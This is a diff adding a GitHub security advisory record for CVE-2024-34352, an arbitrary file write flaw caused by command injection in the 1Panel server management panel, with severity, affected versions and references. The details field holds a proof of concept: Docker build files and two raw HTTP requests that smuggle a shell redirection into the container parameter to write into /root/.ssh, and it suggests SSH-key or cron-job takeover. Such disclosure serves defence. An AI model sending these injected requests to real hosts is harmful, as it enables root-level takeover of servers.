@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-f8ch-w75v-c847",
+  "modified": "2024-05-14T20:03:08Z",
+  "published": "2024-05-09T15:14:24Z",
+  "aliases": [
+    "CVE-2024-34352"
+  ],
+  "summary": "1Panel arbitrary file write vulnerability",
+  "details": "### Summary\nThere are many command injections in the project, and some of them are not well filtered, leading to arbitrary file writes, and ultimately leading to RCEs.\nWe can use the following mirror configuration write symbol `>` to achieve arbitrary file writing\n\n### PoC\nDockerfile\n```\nFROM bash:latest\n\nCOPY echo.sh /usr/local/bin/echo.sh\nRUN chmod +x /usr/local/bin/echo.sh\nCMD [\"echo.sh\"]\n```\necho.sh\n```\n#!/usr/local/bin/bash\necho \"Hello, World!\"\n```\nBuild this image like this, upload it to dockerhub, and then 1panel pulls the image to build the container\nSend the following packet, taking care to change the containerID to the malicious container we constructed\n\n```\nGET /api/v1/containers/search/log?container=6e6308cb8e4734856189b65b3ce2d13a69e87d2717898d120dac23b13b6f1377%3E%2Ftmp%2F1&since=all&tail=100&follow=true HTTP/1.1\nHost: xxxx:42713\nConnection: Upgrade\nPragma: no-cache\nCache-Control: no-cache\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36\nUpgrade: websocket\nOrigin: http://xxx:42713\nSec-WebSocket-Version: 13\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: psession=88e51389-ddce-468c-a3be-51c5b2cb2d9d\nSec-WebSocket-Key: FdXBKFviqO4+LSEoucITLA==\n```\nThen you can write any customized file to, for example, a ssh key, and generally the application is run with root privileges\n```\nGET /api/v1/containers/search/log?container=6e6308cb8e4734856189b65b3ce2d13a69e87d2717898d120dac23b13b6f1377%3E%2Froot%2F.ssh%2f1&since=all&tail=100&follow=true HTTP/1.1\nHost: xxx:42713\nConnection: Upgrade\nPragma: no-cache\nCache-Control: no-cache\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36\nUpgrade: websocket\nOrigin: http://xxx:42713\nSec-WebSocket-Version: 13\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: psession=88e51389-ddce-468c-a3be-51c5b2cb2d9d\nSec-WebSocket-Key: FdXBKFviqO4+LSEoucITLA==\n```\nOr write a timed task to execute any command.\n### Impact\nThe ability to write arbitrary files on the host where the service is deployed can lead to a host takeover\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/1Panel-dev/1Panel"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.10.3-lts"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-f8ch-w75v-c847"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-34352"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/1Panel-dev/1Panel"
+    },
+    {
+      "type": "WEB",
+      "url": "https://pkg.go.dev/vuln/GO-2024-2830"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-77"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-05-09T15:14:24Z",
+    "nvd_published_at": "2024-05-14T15:38:43Z"
+  }
+}
